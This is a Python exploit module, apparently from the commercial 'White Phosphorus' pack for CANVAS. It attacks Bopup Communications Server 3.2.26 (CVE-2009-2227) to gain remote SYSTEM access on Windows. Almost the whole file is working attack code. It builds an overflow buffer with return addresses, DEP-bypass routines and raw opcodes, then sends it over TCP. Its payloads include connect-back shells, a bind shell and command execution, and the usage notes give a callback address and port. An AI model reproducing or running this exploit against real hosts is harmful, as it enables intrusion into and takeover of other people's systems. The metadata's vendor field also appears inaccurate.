
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Bopup Communications Server 3.2.26"
DESCRIPTION = "Bopup Communications Server 3.2.26 Remote SYSTEM Exploit"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION["Date public"] = "2009-06-23"
DOCUMENTATION["Repeatability"] = "Multiple"
DOCUMENTATION['CVE Name']="CVE-2009-2227"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2227'
DOCUMENTATION["References"] = """
http://www.blabsoft.com/products/server/
http://secunia.com/advisories/35516"""
DOCUMENTATION["Notes"] = """
Although there is a public exploit for this, there does not appear to be a patch.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP","Vista","7","2000"] 


NOTES="""
WP> White Phosphorus Exploit Pack
WP> Bopup Communications Server 3.2.26
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Autoversioning
1: Windows 2003 SP1-SP2
2: Windows XP SP2-SP3
3: Windows Other (Non DEP)

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: Bind MOSDEF Shell
3: Execute Command
4: Socket Reuse

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_bopup_coms/wp_bopup_coms.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 19810
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {  
    0 : ["Autoversioning", (0x00000000), []],
    1 : ["Windows 2003 SP1-SP2", (0x77ba0e10), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows XP SP2-SP3", (0x77c10e10), [WINXPSP2, WINXPSP3]],
    3 : ["Windows Other (Non DEP)", (0x00000000 ), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "Bind MOSDEF Shell",
              "Execute Command",
              "Socket Reuse"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        return wp_isPortOpen(self,self.host,self.port)

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        if self.version == 0:
            return 0

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        # Autoversioning OS/target detection
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):

        payload = '\x01\x00\x00\x00'
        
        if self.version == 1 or self.version == 2:
    
            payload += wp_randomstring(600)
            payload += 'A'*201
    
            payload += pack('<L', targets[self.version][1]) * 13 # our spare readable address  MSVCRT
            payload += 'Z'*24
    
            if self.version == 1:
                payload += self.wp_UniversalDEPBypassWin2k3_VP(200) 
                
            elif self.version == 2:
                payload += self.wp_UniversalDEPBypassWinXP_VP(200) 
                
            payload +="\x90"
            
            payload +="\x33\xC0"            # XOR EAX,EAX
            payload +="\x66\xB8\xFB\x59"    # MOV AX,59FB
            payload +="\xC1\xE0\x02"        # SHL EAX,2
            payload +="\x2B\xE0"            # SUB ESP,EAX
            payload +="\x83\xEC\x02"        # SUB ESP,2
            payload +="\xC3"                # RETN
            payload +="\x00"
            
            if self.version == 1:
                payload += self.wp_UniversalDEPBypassWin2k3_VP(len(self.shellcode)+8) 
                
            elif self.version == 2:
                payload += self.wp_UniversalDEPBypassWinXP_VP(len(self.shellcode)+8) 
                
            payload +="\x83\xEC\x02"        # SUB ESP,2 (To align ESP)
            payload += self.shellcode
        else:
            # Non DEP Bypass
            payload += 'A'*848
            payload += '\xE9\x91\xd8\xFE\xFF' #jmp back
            payload += '\x43'*8	                    
            payload += '\xEB\xF1\xFF\xFF' #short jump
            payload += '\xE0\x14\x40\x00' #p/p/r bcssrvc (universal) 004014e0
            payload += self.shellcode
            
            
        
        return payload


    def run(self):
        self.getArgs()

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        
        payload = self.makesploit()
        
        self.result_error = 0
        
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit")
            s.sendall(payload)
            time.sleep(2)
            
            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0        

        time.sleep(3)
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
